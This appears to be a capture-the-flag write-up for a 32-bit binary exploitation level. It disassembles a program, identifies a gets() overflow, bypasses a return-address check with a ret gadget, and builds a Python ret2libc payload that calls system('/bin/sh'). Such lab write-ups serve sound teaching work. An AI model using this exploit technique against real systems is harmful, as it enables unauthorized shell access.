# LEVEL 2

```asm
0804853f <main>:
 804853f:	55                   	push   ebp
 8048540:	89 e5                	mov    ebp,esp
 8048542:	83 e4 f0             	and    esp,0xfffffff0
 8048545:	e8 8a ff ff ff       	call   80484d4 <p>
 804854a:	c9                   	leave
 804854b:	c3                   	ret
```
The `main` function is only calling the `p` function.
```asm
080484d4 <p>:
 80484d4:	55                   	push   ebp
 80484d5:	89 e5                	mov    ebp,esp
 80484d7:	83 ec 68             	sub    esp,0x68
 80484da:	a1 60 98 04 08       	mov    eax,ds:0x8049860
 80484df:	89 04 24             	mov    DWORD PTR [esp],eax
 80484e2:	e8 c9 fe ff ff       	call   80483b0 <fflush@plt>
 80484e7:	8d 45 b4             	lea    eax,[ebp-0x4c]
 80484ea:	89 04 24             	mov    DWORD PTR [esp],eax
 80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>
```
The `p` function has a stack of 104 bytes. Its using gets to fill a buffer at `[ebp - 76]`.   
Since there is no direct shell invocation inside of the binary, we'll have to craft our own ret2libc.
The objective is: `system("/bin/sh")`.
```asm
080484d4 <p + 0x1e>:
 80484f2:	8b 45 04             	mov    eax,DWORD PTR [ebp+0x4]
 80484f5:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
 80484f8:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
 80484fb:	25 00 00 00 b0       	and    eax,0xb0000000
 8048500:	3d 00 00 00 b0       	cmp    eax,0xb0000000
 8048505:	75 20                	jne    8048527 <p+0x53>
 ...
 804851b:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 8048522:	e8 a9 fe ff ff       	call   80483d0 <_exit@plt>
```
After reading user input, the function is copying its own return address into its stack space,
and compares the first byte to 0xb0. This is here to avoid that we overwrite a return into a
known address, like the local buffer, because stack addresses starts with this prefix on the
machine. However we can bypass this with a simple trick.   
If, as the `p` return address, we put the `p` `ret` instruction address, the code will just jump
on itself, popping the value from the stack and then `ret` again. Thus we can put our custom return
address after the original one and avoid the verification.   
```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>

// TODO: explain how to find /bin/sh
```
The `system` symbol is present from the dynamic linking with libc, and this .so file also contains
the string `"/bin/sh"`.   
With those 2 addresses, the only thing we have to do is craft our payload. So 80 bytes of padding,
76 of stack + `old_ebp`, the `p` `ret` address, the `system` address, a dummy value to simulate
the return address that should have been pushed by the `call` instruction, and finally our string
address.
```python
PADDING = 80
RET     = 0x0804853e
SYSTEM  = 0xb7e6b060
BINSH   = 0xb7f8cc58

payload = b"\x90" * PADDING
payload += p32(RET) + p32(SYSTEM) + p32(0x90909090) + p32(BINSH)
```
